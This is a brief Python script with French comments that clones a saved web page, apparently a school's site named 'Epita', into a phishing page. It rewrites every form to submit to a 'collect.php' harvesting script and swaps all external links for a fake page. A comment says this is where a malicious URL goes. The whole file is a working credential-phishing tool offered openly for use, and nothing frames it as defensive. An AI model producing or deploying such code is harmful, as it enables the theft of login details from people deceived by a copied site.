from bs4 import BeautifulSoup

def modify_phishing_page(input_file="Epita.html", output_file="phishing_page.html"):
    with open(input_file) as f:
        soup = BeautifulSoup(f, features="html.parser")
    
    # Modifier les formulaires pour pointer vers notre script de collecte
    for form in soup.find_all('form'):
        form['action'] = 'collect.php'
    
    # Modifier les liens absolus en liens relatifs si nécessaire
    for a in soup.find_all('a', href=True):
        if a['href'].startswith('http'):
            # Remplacer par votre URL malveillante ou un lien relatif
            a['href'] = 'fake_page.php'
    
    # Sauvegarder la page modifiée
    with open(output_file, "w") as f:
        f.write(str(soup))